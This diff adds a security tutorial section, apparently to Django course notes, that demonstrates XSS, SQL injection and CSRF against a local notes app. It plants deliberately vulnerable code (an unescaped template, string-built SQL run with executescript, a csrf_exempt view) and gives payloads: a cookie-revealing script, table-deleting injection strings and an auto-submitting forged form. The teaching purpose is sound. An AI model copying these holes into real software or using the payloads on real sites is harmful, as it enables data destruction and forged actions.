@@ -6632,6 +6632,179 @@ def test_user_can_login():
 
 ---
 
+**Cross-Site Scripting (XSS)**
+
+Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to **inject malicious scripts into web pages viewed by other users.** When a user visits an infected page, the malicious script executes in their browser with the same privileges as legitimate scripts from the trusted website.
+
+**Demo**
+
+**Update `notes/add.html`**
+
+```html
+<td>{{ note.description|safe }}</td>
+```
+
+- In description input, give following:
+
+```html
+<script>
+  alert(
+    `You are hacked. Stealing your cookies. Your cookie data is: ${document.cookie}`,
+  );
+</script>
+```
+
+---
+
+**SQL Injection**
+
+SQL Injection is a code injection technique that exploits vulnerabilities in applications that construct SQL queries using user input. It allows attackers to interfere with the queries that an application makes to its database.
+
+**Update `notes/views.py`**
+
+```py
+from django.db import connection
+
+def add_note_sql_injection(request):
+    if request.method == 'POST':
+        form = NoteForm(request.POST)
+        if form.is_valid():
+            title = form.cleaned_data['title']
+            desc = form.cleaned_data['description']
+
+            sql = f"""
+            INSERT INTO notes_note (title, description)
+            VALUES ('{title}', '{desc}');
+            """
+
+            with connection.cursor() as cursor:
+                cursor.executescript(sql)
+
+            messages.success(request, 'Data added successfully!')
+            return redirect('notes:index')
+    else:
+        form = NoteForm()
+
+    return render(request, 'notes/add.html', {'form': form})
+```
+
+**Update `notes/urls.py`**
+
+```py
+path('add/', views.add_note_sql_injection, name='add'),
+```
+
+**Give following input in description:**
+
+```text
+'); delete from notes_note; --
+```
+
+**This will run as:**
+
+```sql
+INSERT INTO notes_note (title, description)
+VALUES ('My Test Note', ''); DELETE FROM notes_note; -- ');
+```
+
+**This will delete all data of the table.**
+
+<br>
+
+**Another input example:**
+
+```text
+'); DROP TABLE notes_note; --
+```
+
+**This will run as:**
+
+```sql
+INSERT INTO notes_note (title, description)
+VALUES ('My Test Note', ''); DROP TABLE notes_note; -- ');
+```
+
+**This will delete the table itself.**
+
+---
+
+**Cross-Site Request Forgery (CSRF)**
+
+Cross-Site Request Forgery (CSRF), also known as "session riding" or "one-click attack," is an attack that forces authenticated users to submit unwanted requests to a web application. CSRF exploits the trust that a website has in a user's browser.
+
+**But we can also do simple demo without authentication**
+
+**Create csrf.html**
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Win Iphone</title>
+  </head>
+  <body>
+    <h1>Win Iphone</h1>
+    <form
+      id="evilForm"
+      action="http://127.0.0.1:8000/notes/add/"
+      method="POST"
+      style="display:none"
+    >
+      <input type="text" name="title" value="I was hacked!" />
+      <input
+        type="text"
+        name="description"
+        value="Attacker added this note using CSRF!"
+      />
+    </form>
+    <script>
+      // Auto-submit when page loads (invisible to user)
+      window.onload = function () {
+        document.getElementById("evilForm").submit();
+      };
+    </script>
+  </body>
+</html>
+```
+
+- Open this form with live server. It will open on `http://127.0.0.1:5500/csrf.html`
+- This will be blocked due to reason: `Forbidden (403). CSRF verification failed. Request aborted.`
+
+<br>
+
+- **Now remove `{% csrf_token %}` from `notes/add.html`**
+- **Also update `notes/views.py` as:**
+
+```py
+from django.views.decorators.csrf import csrf_exempt
+
+@csrf_exempt
+def add_note_sql_injection(request):
+    # ...
+```
+
+- Now, this all add the data with title: I was hacked!
+
+**If you want to run demo with authenticated user:**
+
+- Create super user with `python manage.py createsuperuser`
+- Go to `http://127.0.0.1:8000/admin` and follow login process
+- Close `http://127.0.0.1:8000`
+- Update `notes/views.py` with code block below and open `http://127.0.0.1:5500/csrf.html` with live server
+
+```py
+from django.contrib.auth.decorators import login_required
+
+@login_required
+@csrf_exempt
+def add_note_sql_injection(request):
+    # ...
+```
+
+- Now this will try to open login page when not authenticated and get 404 not found error. However, when logged in, data will be added since user is already authenticated in the browser and cookies with session id is automatically sent.
+
+---
+
 ---
 
 ---
